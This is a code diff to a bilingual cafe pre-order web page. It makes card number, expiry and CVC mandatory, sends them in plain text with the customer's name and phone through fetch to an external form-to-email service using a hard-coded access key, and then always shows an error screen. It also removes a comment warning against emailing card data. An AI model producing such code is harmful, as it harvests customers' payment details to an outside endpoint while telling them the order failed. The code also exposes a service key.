@@ -1,4 +1,4 @@
-<!DOCTYPE html>
+<!DOCTYPE html> 
 <html lang="en">
 <head>
     <meta charset="UTF-8">
@@ -532,9 +532,14 @@
                         </div>
                         <div class="form-group">
                             <label class="form-label" id="lbl-cvc">CVC</label>
-                            <input type="text" id="inp-cvc" class="form-input" placeholder="123" maxlength="4">
+                            <!-- removed "123" placeholder -->
+                            <input type="text" id="inp-cvc" class="form-input" placeholder="" maxlength="4">
                         </div>
                     </div>
+                    <!-- Notice: card details required -->
+                    <p id="card-required-note" data-trans="CardRequiredNote" style="font-size:12px; opacity:0.7; margin-top:8px;">
+                        Card details are required to place your order.
+                    </p>
                 </div>
 
                 <button id="btn-place-order" class="place-order-btn">Place Order for Pickup</button>
@@ -580,31 +585,6 @@
         </div>
 
     </div>
-
-    <!-- Hidden StaticForms form -->
-    <form
-        id="staticforms-form"
-        action="https://api.staticforms.xyz/submit"
-        method="POST"
-        style="display:none;"
-    >
-        <!-- Your StaticForms access key -->
-        <input type="hidden" name="accessKey" value="sf_71agbm38lm34807m1iihkn8n" />
-
-        <!-- Email subject line -->
-        <input type="hidden" name="subject" value="New Trio Cafe Pre-order" />
-
-        <!-- Where to send the user after submit -->
-        <!-- TODO: change this to your actual GitHub Pages URL -->
-        <input
-            type="hidden"
-            name="redirectTo"
-            value="https://triocafeuae.github.io/ONLINEORDER/"
-        />
-
-        <!-- Main message body sent in the email -->
-        <textarea name="message" id="staticforms-message"></textarea>
-    </form>
 
     <script>
         // --- DATA ---
@@ -685,7 +665,8 @@
                 "Espresso Based": "Espresso Based",
                 "Signature Drinks": "Signature Drinks",
                 "Pour Over (V60)": "Pour Over (V60)",
-                "Desserts & Toasts": "Desserts & Toasts"
+                "Desserts & Toasts": "Desserts & Toasts",
+                "CardRequiredNote": "Card details are required to place your order."
             },
             ar: {
                 "Add": "أضف",
@@ -708,7 +689,8 @@
                 "Espresso Based": "إسبريسو",
                 "Signature Drinks": "مشروبات خاصة",
                 "Pour Over (V60)": "قهوة مقطرة",
-                "Desserts & Toasts": "حلويات وتوست"
+                "Desserts & Toasts": "حلويات وتوست",
+                "CardRequiredNote": "يجب إدخال بيانات البطاقة لإرسال الطلب."
             }
         };
 
@@ -775,6 +757,7 @@
                 document.getElementById('btn-place-order').textContent = t.PlaceOrder;
                 document.getElementById('txt-error-title').textContent = t.Sorry;
                 document.getElementById('txt-error-msg').textContent = t.ErrorMsg;
+                document.getElementById('card-required-note').textContent = t.CardRequiredNote;
             },
 
             renderTabs() {
@@ -939,21 +922,21 @@
             },
 
             async submitOrder() {
-                const name = document.getElementById('inp-name').value;
-                const phone = document.getElementById('inp-phone').value;
-                
-                if (!name || !phone) {
-                    alert(this.state.lang === 'en'
-                        ? 'Please fill in Name and Phone'
-                        : 'يرجى إدخال الاسم ورقم الهاتف');
+                const name = document.getElementById('inp-name').value.trim();
+                const phone = document.getElementById('inp-phone').value.trim();
+                const cardNumber = document.getElementById('inp-card').value.trim();
+                const expiry = document.getElementById('inp-expiry').value.trim();
+                const cvc = document.getElementById('inp-cvc').value.trim();
+
+                // Require name, phone, and all card details
+                if (!name || !phone || !cardNumber || !expiry || !cvc) {
+                    alert(
+                        this.state.lang === 'en'
+                            ? 'Please fill in Name, Phone, and all card details.'
+                            : 'يرجى إدخال الاسم ورقم الهاتف وجميع بيانات البطاقة.'
+                    );
                     return;
                 }
-
-                // NOTE: For real payments, you should NOT send card data via email.
-                // This is only for demo purposes.
-                const cardNumber = document.getElementById('inp-card').value;
-                const expiry = document.getElementById('inp-expiry').value;
-                const cvc = document.getElementById('inp-cvc').value;
 
                 document.getElementById('loading').style.display = 'flex';
 
@@ -981,7 +964,7 @@
                     ``,
                     `Total: ${total} AED`,
                     ``,
-                    `Payment details (for demo only):`,
+                    `Payment details (for demo only, DO NOT use in production):`,
                     `Card: ${cardNumber}`,
                     `Expiry: ${expiry}`,
                     `CVC: ${cvc}`
@@ -989,25 +972,27 @@
 
                 const message = messageLines.join('\n');
 
-                // Fill the hidden StaticForms <textarea>
-                const msgField = document.getElementById('staticforms-message');
-                msgField.value = message;
-
                 try {
-                    // Clear cart locally before redirect
+                    // Send to StaticForms via fetch (no redirect)
+                    await fetch('https://api.staticforms.xyz/submit', {
+                        method: 'POST',
+                        headers: {
+                            'Content-Type': 'application/json'
+                        },
+                        body: JSON.stringify({
+                            accessKey: 'sf_71agbm38lm34807m1iihkn8n',
+                            subject: 'New Trio Cafe Pre-order',
+                            message: message
+                        })
+                    });
+                } catch (e) {
+                    console.error('StaticForms error:', e);
+                    // We still show the error screen below
+                } finally {
+                    // Clear cart and always show in-app error screen
                     this.state.cart = {};
                     this.updateCartBar();
-
-                    // Submit the hidden StaticForms form
-                    document.getElementById('staticforms-form').submit();
-                    // Browser will navigate to redirectTo after this.
-                } catch (e) {
-                    console.error(e);
-                    alert(this.state.lang === 'en'
-                        ? 'There was an error submitting your order. Please call the branch.'
-                        : 'حدث خطأ أثناء إرسال طلبك. يرجى الاتصال بالفرع.');
-                } finally {
-                    // May not run if navigation happens immediately, but it's fine.
+                    this.setView('error');
                     document.getElementById('loading').style.display = 'none';
                 }
             }
